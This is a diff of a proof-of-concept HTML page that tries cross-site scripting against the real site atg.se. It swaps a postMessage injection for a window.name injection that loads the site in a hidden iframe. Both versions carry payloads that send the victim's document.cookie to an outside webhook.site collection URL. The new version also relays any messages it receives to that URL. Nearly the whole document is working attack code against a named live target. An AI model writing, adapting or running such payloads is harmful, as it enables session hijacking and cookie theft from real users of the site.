@@ -1,28 +1,29 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-    <head>
-        <title>PoC: postMessage XSS</title>
-    </head>
-    <body>
-        <h1>Trying postMessage injection...</h1>
+  <head>
+    <title>PoC - window.name XSS</title>
+  </head>
+  <body>
+    <h1>Loading…</h1>
 
-        <iframe
-            id="atg"
-            sandbox="allow-scripts allow-same-origin"
-            src="https://www.atg.se"
-            style="width: 100%; height: 800px"
-        ></iframe>
+    <script>
+      // Payload you'd want ATG to render (will only work if ATG reads window.name unsafely)
+      const payload = `<script>fetch('https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6?cookie='+document.cookie)</script>`;
 
-        <script>
-            const iframe = document.getElementById("atg");
+      // Set the payload in window.name (only useful if the iframe reads it)
+      window.name = payload;
 
-            // Payload to be sent to the iframe
-            const payload = `<img src=x onerror="fetch('https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6?c='+document.cookie)">`;
+      // Create the iframe
+      const iframe = document.createElement("iframe");
+      iframe.src = "https://www.atg.se/";
+      iframe.sandbox = "allow-scripts allow-same-origin";
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
 
-            iframe.onload = () => {
-                iframe.contentWindow.postMessage(payload, "*");
-                console.log("Payload sent via postMessage");
-            };
-        </script>
-    </body>
+      // Optional: listen for messages from the iframe (in case it sends any)
+      window.addEventListener("message", function (e) {
+        fetch("https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6/log?msg=" + encodeURIComponent(e.data));
+      });
+    </script>
+  </body>
 </html>
